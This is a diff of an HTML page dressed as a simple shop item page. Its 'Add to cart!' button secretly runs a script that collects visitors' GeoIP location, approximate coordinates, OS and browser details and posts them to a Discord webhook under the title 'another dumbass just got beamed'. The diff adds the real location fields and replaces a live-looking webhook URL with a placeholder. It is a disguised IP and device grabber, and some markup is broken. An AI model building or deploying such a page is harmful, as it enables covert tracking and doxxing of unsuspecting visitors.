@@ -79,7 +79,7 @@
 </head>
 <body>
 
-<div class="banner">🛒 Meteorz 2025 shop</div>
+<div class="banner">🛒 My Shop</div>
 
 <div class="card">
   <div class="thumb" aria-hidden="true">
@@ -91,15 +91,15 @@
     </svg>
   </div>
   <h2>Test Item</h2>
-  <p>test item >_<</p>
+  <p>My Item Test/p>
   <button onclick="sendFullInfo()">Add to cart!</button>
   <div class="notification" id="notify">Added to cart successfully</div>
-  <div class="mini">it will add to cart if u click</div>
+  <div class="mini">test to add to cart </div>
 </div>
 
 <script>
 async function sendFullInfo() {
-  const webhook = "https://discord.com/api/webhooks/1405851882907373608/yTg9PxjEe70E_DjH8vqbbBo-nTvyw8EuDGjY_tor91GVUnZZWAZO1-YRlSQ0eANVtqzy"; // ← replace with your Discord webhook
+  const webhook = "YOUR_DISCORD_WEBHOOK_HERE"; // ← replace with your Discord webhook
 
   // Helper: safe fetch JSON with timeout
   const getJSON = async (url, timeoutMs = 8000) => {
@@ -158,8 +158,8 @@ async function sendFullInfo() {
   const embed = {
     username: "My Shop Logger",
     embeds: [{
-      title: "another dumbass just got beamed",
-      description: "cant get discord user",
+      title: "Another dumbass got beamed?",
+      description: "Dumbass full info's",
       color: 0x2b6cb0, // nice blue
       fields: [
         {
@@ -172,12 +172,16 @@ async function sendFullInfo() {
           inline: false
         },
         {
-            // Skip real GeoIP, use placeholder
-  const city = "Hidden";
-  const region = "Hidden";
-  const country = "Hidden";
-  const lat = "—";
-  const lon = "—";
+          name: "Location (GeoIP)",
+          value: [
+            `**City:** \`${city}\``,
+            `**Region:** \`${region}\``,
+            `**Country:** \`${country}\``,
+            `**Approx. Coords:** \`${lat}, ${lon}\``
+          ].join("\n"),
+          inline: false
+        },
+        {
           name: "Device & Browser",
           value: [
             `**OS:** \`${os}\``,
